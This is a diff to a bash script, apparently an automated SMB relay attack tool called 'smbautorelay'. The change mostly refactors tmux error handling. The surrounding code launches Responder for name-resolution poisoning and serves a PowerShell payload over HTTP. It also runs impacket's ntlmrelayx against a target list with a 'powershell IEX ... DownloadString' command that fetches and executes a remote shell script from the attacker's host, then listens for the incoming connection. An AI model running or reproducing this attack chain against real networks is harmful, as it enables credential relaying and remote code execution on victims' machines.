@@ -222,30 +222,39 @@ function checkResponderConfig(){
 	
 }
 
+function bTmux(){
+	tmux kill-session -t "smbautorelay*" &>/dev/null
+	echo -e "${redColour}[D:]${endColour} Tmux blew up... That hurts! >.< . Try running me again\n"; badExit
+}
+
 function relayingAttack(){
 
    	which tmux &>/dev/null
    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} tmux not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
-
 	tmux start-server &>/dev/null
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to start Tmux server. Existing...\n"; badExit; else sleep 2; fi
+	if [ $? -ne 0 ];then bTmux else sleep 2; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
 	tmux new-session -d -t "smbautorelay" &>/dev/null
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create Tmux session 'smbautorelay'. Existing...\n"; badExit; else sleep 0.5; fi
+	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+	
 	tmux rename-window "smbautorelay" &>/dev/null && tmux split-window -h &>/dev/null
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
+	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
 
 	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
-	if [ $? -ne 0 ];then let paneID+=1; tmux select-pane -t $paneID > /dev/null 2>&1; fi
+	if [ $? -ne 0 ];then 
+		let paneID+=1; tmux select-pane -t $paneID > /dev/null 2>&1
+		if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+	fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
 
     test -f $(pwd)/responder/Responder.py &>/dev/null
     if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} responder not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
-	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null && sleep 1
+	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null 
+	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
 
     which ifconfig &>/dev/null
     if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} net-tools not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
@@ -270,7 +279,7 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
 	
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && sleep 1 && tmux split-window &>/dev/null
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
+	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
 	
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
 	
@@ -278,7 +287,8 @@ function relayingAttack(){
     	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	
     	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m &>/dev/null && sleep 1
+	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m &>/dev/null
+	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.5; fi
 	
